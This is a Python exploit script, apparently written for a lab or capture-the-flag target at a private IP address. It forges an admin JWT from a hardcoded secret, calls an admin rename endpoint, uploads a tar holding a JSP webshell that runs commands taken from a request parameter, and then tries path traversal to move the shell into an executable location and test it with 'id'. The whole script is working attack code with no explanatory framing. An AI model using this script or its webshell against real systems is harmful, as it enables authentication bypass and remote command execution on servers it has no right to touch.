#!/usr/bin/env python3
"""
使用URL参数调用rename
"""

import jwt
import requests
import urllib.parse

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[+] 使用URL参数调用rename\n")

# 参数通过 URL query string 传递
params_list = [
    {"oldPath": "shell.jsp", "newName": "s.jsp"},  # 先测试同目录rename
    {"oldPath": "test.txt", "newName": "test2.txt"},  # 测试已知文件
]

for i, params in enumerate(params_list, 1):
    print(f"[*] 尝试 #{i}: {params}")
    try:
        r = requests.post(
            f"{TARGET}/admin/rename",
            headers=headers,
            params=params,  # URL参数而不是JSON body
            timeout=5
        )
        print(f"    状态: {r.status_code}")
        print(f"    响应: {r.text}")
        
        if "true" in r.text.lower():
            print(f"    [+] Rename成功！")
            
            # 检查新文件
            newname = params.get("newName", "")
            r2 = requests.get(f"{TARGET}/dashboard/download?path={newname}", headers=headers, timeout=5)
            if r2.status_code == 200:
                print(f"      [+] 新文件存在: {newname}")
                print(f"      内容: {r2.text[:100]}")
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("\n[*] 如果rename成功，现在上传webshell并移动到根目录")

# 上传一个新的JSP
print("[*] 上传webshell...")
import tarfile
import io

jsp_code = b"""<%out.print(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream().read());%>"""

tar_buffer = io.BytesIO()
tar = tarfile.open(fileobj=tar_buffer, mode='w')
info = tarfile.TarInfo(name="w.jsp")
info.size = len(jsp_code)
tar.addfile(tarinfo=info, fileobj=io.BytesIO(jsp_code))
tar.close()
tar_data = tar_buffer.getvalue()

try:
    files = {'file': ('w.tar', tar_data, 'application/x-tar')}
    r = requests.post(
        f"{TARGET}/admin/upload",
        headers={"Cookie": f"token={admin_token}"},
        files=files,
        timeout=10
    )
    print(f"  上传状态: {r.status_code} - {r.text}")
except Exception as e:
    print(f"  Error: {e}")

# 尝试rename到上级目录（如果路径验证允许）
print("\n[*] 尝试移动w.jsp到可执行位置")
rename_attempts = [
    {"oldPath": "w.jsp", "newName": "../w.jsp"},
    {"oldPath": "w.jsp", "newName": "../../w.jsp"},
]

for attempt in rename_attempts:
    try:
        r = requests.post(
            f"{TARGET}/admin/rename",
            headers=headers,
            params=attempt,
            timeout=5
        )
        print(f"  {attempt} -> {r.text[:100]}")
        
        if "true" in r.text:
            print(f"    [+] 可能成功移动!")
            # 测试访问
            for test_url in ["/w.jsp", "/uploads/../w.jsp"]:
                try:
                    r2 = requests.get(f"{TARGET}{test_url}?c=id", headers=headers, timeout=5)
                    if r2.status_code == 200:
                        print(f"      [+] Shell可访问: {test_url}")
                        print(f"          响应: {r2.text[:200]}")
                except:
                    pass
    except:
        pass

print("\n[+] 完成")
